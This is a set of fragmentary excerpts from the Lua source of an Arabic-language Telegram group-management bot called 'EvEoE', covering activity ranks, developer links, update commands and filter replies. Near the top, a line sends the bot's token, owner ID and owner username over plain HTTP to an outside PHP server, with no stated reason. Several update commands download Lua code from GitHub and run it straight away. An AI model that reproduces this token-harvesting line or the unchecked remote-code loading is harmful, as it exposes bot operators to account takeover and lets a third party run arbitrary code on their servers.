...
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
res = https.request('http://Tshake.ga/EvEoE/EvEoE.php?token='..token..'&user='..SUDO..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
...
(تمت برمجةة السورس من قبل @moqtad_a )
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/EvEoE/Files_EvEoE/master/File_Bot/commands.lua") 
...
EvEoE_Msg = 'قمة التفاعل🤸‍♂️😻' 
elseif msgs < 5500 then 
EvEoE_Msg = 'اقوى متفاعل😳😻' 
elseif msgs < 7000 then 
EvEoE_Msg = 'ملك التفاعل🤴😍' 
elseif msgs < 9500 then 
EvEoE_Msg = 'امبروطور التفاعل💂‍♀️😻' 
elseif msgs < 10000000000 then 
EvEoE_Msg = 'رب التفاعل✔️😍'  
end 
return EvEoE_Msg 
end
...
os.execute('wget https://raw.githubusercontent.com/EvEoE/EvEoETEAM/master/EvEoE.lua')
send(msg.chat_id_, msg.id_,'🔭| تم تحديث البوت \n📮| لديك اخر اصدار سورس ايفو\n📡| الاصدار ← { 1.2v}')
dofile('EvEoE.lua')  
end
...
os.execute('rm -rf EvEoE.lua')
os.execute('wget https://raw.githubusercontent.com/EvEoETEAM/EvEoE/master/EvEoE.lua')
send(msg.chat_id_, msg.id_,'??| تم تحديث البوت \n📮| لديك اخر اصدار سورس ايفو\n📡| الاصدار ← { 1.2v}')
dofile('EvEoE.lua')  
end
...
🎟️↬ [Developer source](t.me/EoEvE1)

🔹↬ [Information](https://t.me/EvEoE1)

🎗️↬ [phrase](t.me/EoEvE)
----------------------------------
💠↬ [TwSl EvEoE](t.me/moqtad_a)
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
if SudoBot(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/EvEoE/Files_EvEoE/master/getfile.json")
if res == 200 then
...
local json_file, res = https.request("https://raw.githubusercontent.com/EvEoE/Files_EvEoE/master/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('EvEoE.lua')  
else
send(msg.chat_id_, msg.id_,"⚠️| عذرا هاذا ملف ليس من ملفات سورس ايفو\n") 
end
return false
end
...
------------------------------------------------------------------------
local EvEoEbot = database:get(bot_id.."Add:Filter:Rp2"..text..result.chat_id_)   
if EvEoEbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠¦العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n📛¦["..EvEoEbot.."] \n") 
